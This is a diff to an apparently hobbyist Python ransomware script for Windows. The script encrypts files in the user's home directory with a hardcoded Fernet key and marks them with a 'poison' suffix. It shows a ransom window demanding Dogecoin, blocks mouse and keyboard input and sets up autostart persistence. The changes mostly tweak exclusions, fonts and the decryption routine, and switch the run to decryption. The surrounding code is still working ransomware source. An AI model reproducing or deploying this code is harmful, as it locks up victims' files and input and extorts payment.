@@ -19,10 +19,9 @@ executing = True
 filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
 KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
 DEST_PATH: Final = f"C:\\Users\\{getuser()}"
-DIR_EXCLUSIONS: Final = [".vscode", "AppData", "encrypt.py", ".git", "Searches"]
+DIR_EXCLUSIONS: Final = [".vscode", "AppData", "encrypt.py", ".git", "Searches", ".venv"]
 FILE_SUFFIX: Final = "poison"
 FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms", "gitconfig"]
-URL: Final = ("https://ia903206.us.archive.org/31/items/rick-astley-never-gonna-give-you-up/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp3")
 
 
 class Encryption(threading.Thread):
@@ -51,7 +50,6 @@ class Encryption(threading.Thread):
                 if (file_path.__contains__(dir_exclusion)):
                     exception = True
             if (not exception):
-                print(file_path)
                 filtered_file_paths.append(file_path)
 
         return filtered_file_paths
@@ -76,10 +74,10 @@ class Encryption(threading.Thread):
 
 
 class Decryption(threading.Thread):
-    def __init__(self, KEY, FILE_SUFFIX, DEST_PATH, DIR_EXCLUSIONS):
+    def __init__(self, KEY, FILE_SUFFIX, DEST_PATH, FILE_SUFFIX_EXCLUSIONS):
         threading.Thread.__init__(self)
         self.DEST_PATH = DEST_PATH
-        self. DIR_EXCLUSIONS = DIR_EXCLUSIONS
+        self. FILE_SUFFIX_EXCLUSIONS = FILE_SUFFIX_EXCLUSIONS
         self.KEY = KEY
         self.FILE_SUFFIX = FILE_SUFFIX
 
@@ -87,16 +85,16 @@ class Decryption(threading.Thread):
         file_paths = []
         for root, dirs, files in os.walk(self.DEST_PATH):
             for file in files:
-                if (not root.split("\\")[-1] in self.DIR_EXCLUSIONS):
-                    full_path = f"{root}\\{file}"
-                    if (file.__contains__(self.FILE_SUFFIX)):
-                        file_paths.append(full_path)
+                full_path = f"{root}\\{file}"
+                if (file.__contains__(self.FILE_SUFFIX)):
+                    file_paths.append(full_path)
         return file_paths
 
     def decryptFiles(self, file_paths):
         for file in file_paths:
             with open(file, "rb") as binary_file:
                 content = binary_file.read()
+                print(content)
             decrypted_content = Fernet(self.KEY).decrypt(content)
             with open(file, "wb") as binary_file:
                 try:
@@ -112,7 +110,7 @@ class Decryption(threading.Thread):
 # Instances
 ec = Encryption(KEY, FILE_SUFFIX, DEST_PATH,
                 DIR_EXCLUSIONS, FILE_SUFFIX_EXCLUSIONS, False)
-dc = Decryption(KEY, FILE_SUFFIX, DEST_PATH, DIR_EXCLUSIONS)
+dc = Decryption(KEY, FILE_SUFFIX, DEST_PATH, FILE_SUFFIX_EXCLUSIONS)
 window = tk.Tk()
 
 
@@ -190,13 +188,13 @@ window.bind('<Return>', stop_torture)
 window.protocol("WM_DELETE_WINDOW", on_closing)
 
 title = tk.Label(window, bg="red", fg="white",
-                 text="uups, u fucked up :DD", font=("Comic Sans MS", 40))
+                 text="uups, u fucked up :DD", font=("Consolas", 40))
 title.pack(padx=30, pady=30)
 
 ransom = tk.Label(window, bg="red", fg="white", text="All your files have been encrypted. If you want to decrypt them, pay 10 Dogecoins to the following address: 'in21-25a.ch'. We will then give you a decryption key",
-                  font=("Comic Sans MS", 30), wraplength=1200)
-ransom.pack(padx=50, pady=70)
-entry = Entry(window, fg='red', font=('Comic Sans MS', 30))
+                  font=("Consolas", 35), wraplength=1200)
+ransom.pack(padx=50, pady=60)
+entry = Entry(window, fg='red', font=('Consolas', 30))
 entry.pack()
 entry.focus()
 snake = tk.Label(window, bg="red", fg="white", text="""
@@ -215,7 +213,7 @@ snake = tk.Label(window, bg="red", fg="white", text="""
 ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
-""", font=("Arial", 22))
+""", font=("Consolas", 22))
 snake.pack(pady=20)
 
 # create_autostart_regedit()
@@ -224,6 +222,6 @@ create_autostart_dir()
 threading.Thread(target=disable_mouse, daemon=True).start()
 threading.Thread(target=block_keys, daemon=True).start()
 
-ec.start()
+dc.start()
 
-window.mainloop()
+# window.mainloop()
